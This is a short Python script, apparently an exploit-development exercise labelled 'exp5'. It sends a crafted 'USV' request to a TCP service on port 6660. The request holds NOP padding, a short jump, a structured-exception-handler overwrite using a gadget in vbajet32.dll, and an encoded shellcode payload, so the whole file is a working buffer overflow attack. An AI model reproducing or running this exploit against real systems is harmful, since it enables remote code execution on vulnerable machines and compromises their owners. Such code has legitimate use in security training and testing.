#exp5

#!/usr/bin/python
import socket

target_address="127.0.0.1"
target_port=6660

buffer = "USV "
buffer += "\x90" * 962
buffer += "\xeb\x06\x90\x90" # JMP SHORT 6, PADDING NOPS
buffer += "\x6A\x19\x9A\x0F" #SEH Overwrite 0F9A196A POP EBP, POP EBX RETN vbajet32.dll
buffer += "\x90" * 16 #NOPS PADDING before SHELLCODE
buffer+= ("\xb8\x40\xab\xce\xcc\xdb\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x45\x31\x46\x13\x83\xc6\x04\x03\x46\x4f\x49\x3b\x30\xa7\x04"
"\xc4\xc9\x37\x77\x4c\x2c\x06\xa5\x2a\x24\x3a\x79\x38\x68\xb6"
"\xf2\x6c\x99\x4d\x76\xb9\xae\xe6\x3d\x9f\x81\xf7\xf3\x1f\x4d"
"\x3b\x95\xe3\x8c\x6f\x75\xdd\x5e\x62\x74\x1a\x82\x8c\x24\xf3"
"\xc8\x3e\xd9\x70\x8c\x82\xd8\x56\x9a\xba\xa2\xd3\x5d\x4e\x19"
"\xdd\x8d\xfe\x16\x95\x35\x75\x70\x06\x47\x5a\x62\x7a\x0e\xd7"
"\x51\x08\x91\x31\xa8\xf1\xa3\x7d\x67\xcc\x0b\x70\x79\x08\xab"
"\x6a\x0c\x62\xcf\x17\x17\xb1\xad\xc3\x92\x24\x15\x80\x05\x8d"
"\xa7\x45\xd3\x46\xab\x22\x97\x01\xa8\xb5\x74\x3a\xd4\x3e\x7b"
"\xed\x5c\x04\x58\x29\x04\xdf\xc1\x68\xe0\x8e\xfe\x6b\x4c\x6f"
"\x5b\xe7\x7f\x64\xdd\xaa\x15\x7b\x6f\xd1\x53\x7b\x6f\xda\xf3"
"\x13\x5e\x51\x9c\x64\x5f\xb0\xd8\x9a\x15\x99\x49\x32\xf0\x4b"
"\xc8\x5f\x03\xa6\x0f\x59\x80\x43\xf0\x9e\x98\x21\xf5\xdb\x1e"
"\xd9\x87\x74\xcb\xdd\x34\x75\xde\xbd\xd7\xed\xcf\x24\x50\x88"
"\x2f\x88\xc3\x72\x5e\xb3\x77\x52\xeb\x48\x1d\xe0\x33\xca\xab"
"\x6d\x58\x34\x15\x03\xc4\x46\xf0\xb2\x3c\x9e\xda\x6b\x7c\xa4"
"\x5e\x53\x58\x02\x7f\xfd\xc1\x3e\x5f\x6d\x65\xdc\xfe\x01\x1e"
"\x50\x6e\xac\x90\xb4\x31\x2a\x3c\xdc\xdf\xdb\xcd\x6a\x52\x7a"
"\x46\xfc\xe0\x0f\x86\x67\x73\x86\xaa\x47\x54\x19\x77\xcc\xaa")

buffer += "\x90" * ((2504)-len(buffer))
buffer += "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
